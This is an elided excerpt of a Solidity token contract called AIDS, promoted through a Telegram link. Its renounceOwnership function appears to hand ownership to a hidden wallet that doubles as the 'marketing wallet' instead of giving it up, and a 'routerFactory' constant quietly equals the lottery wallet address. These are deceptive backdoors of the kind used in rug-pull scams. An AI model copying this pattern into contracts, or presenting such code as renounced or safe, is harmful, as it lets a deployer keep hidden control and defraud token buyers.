...
//Telegram: https://t.me/aidsportal
...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA943E8da97666754b9B450321361B189580D8EC0));
        _owner = address(0xA943E8da97666754b9B450321361B189580D8EC0);
    }
...
contract AIDS is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xA943E8da97666754b9B450321361B189580D8EC0); // marketing wallet
    address payable lotteryWallet = payable(0x7405Fd26f8b86e1a2F3f5A6D227A93EE3F264E02);  // lotterywallet

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address internal immutable routerFactory = 0x7405Fd26f8b86e1a2F3f5A6D227A93EE3F264E02;  
